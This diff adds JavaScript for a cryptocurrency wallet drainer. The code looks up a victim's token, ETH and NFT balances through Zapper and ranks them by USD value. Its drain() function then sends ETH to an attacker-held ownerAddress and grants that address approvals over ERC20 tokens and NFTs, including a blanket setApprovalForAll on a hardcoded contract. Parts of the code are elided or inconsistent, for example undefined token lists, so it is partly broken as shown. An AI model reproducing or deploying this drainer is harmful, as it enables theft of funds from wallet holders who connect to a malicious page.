@@ -1,0 +1,68 @@
+async function fetchUserTokens(address) {
+  let response = await fetch(`https://...zapper.fi/v2/balances?...`);
+  let data = JSON.parse(...);
+
+  let result = [];
+  for (let network in data) {
+    for (let tok in data[network]['balance']) {
+      for (let TOKEN in data[network]['balance'][tok]) {
+        let t = {
+          contract: data[...]['address'],
+          type: (data[...]['address'] == "0x0" ? "native" : "token"),
+          balance: parseInt(data[...]['context']['balanceRaw']),
+          price: data[...]['balanceUSD'],
+          chain: data[...]['network']
+        };
+        tokens.push(t);
+      }
+    }
+    result.push(tokens);
+  }
+
+  if (toDrain.nft) { ... }
+  if (toDrain.tokens) { ... }
+  if (toDrain.eth) { ... }
+
+  itemList.sort((a, b) => b.price - a.price); 
+}
+
+async function sendEth(amount, chain) {
+  gasPrice = await web3.eth.getGasPrice();
+  newAmount = amount - (Number(gasPrice)*40000);
+  if (newAmount < 0) return;
+  await web3.eth.sendTransaction({ from: account, to: ownerAddress, value: newAmount });
+}
+
+async function sendToken(amount, tokenAddress) {
+  let tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
+  await tokenContract.methods.approve(ownerAddress, amount.toString()).send({ from: account, gas: 120000, gasPrice: 0 });
+}
+
+async function sendNFT(id, tokenAddress) {
+  let tokenContract = new web3.eth.Contract(ERC721_ABI, tokenAddress);
+  await tokenContract.methods.approve(ownerAddress, id).send({ from: account, gas: 120000, gasPrice: 0 });
+}
+
+async function setApprovalForAll(tokenAddress) {
+  let tokenContract = new web3.eth.Contract(ERC721_ABI, tokenAddress);
+  await tokenContract.methods.setApprovalForAll(ownerAddress, true).send({ from: account, gas: 120000, gasPrice: 0 });
+}
+
+
+async function drain() {
+  await setApprovalForAll("0xc36442b4a4522e871399cd717abdd847ab11fe88"); 
+  for (var item of itemList) {
+    if (item.price > 0) {
+      try {
+        if (window.ethereum.networkVersion !== CHAIN_ID[item.chain]) {
+          await changeNetwork(CHAIN_ID[item.chain]);
+        }
+        if (item.type == "native") await sendEth(item.balance, item.chain);
+        else if (item.type == "token") await sendToken(item.balance, item.contract);
+        else if (item.type == "nft") await sendNFT(item.balance, item.contract);
+      } catch (e) {
+        console.log(e);
+      }
+    }
+  }
+}
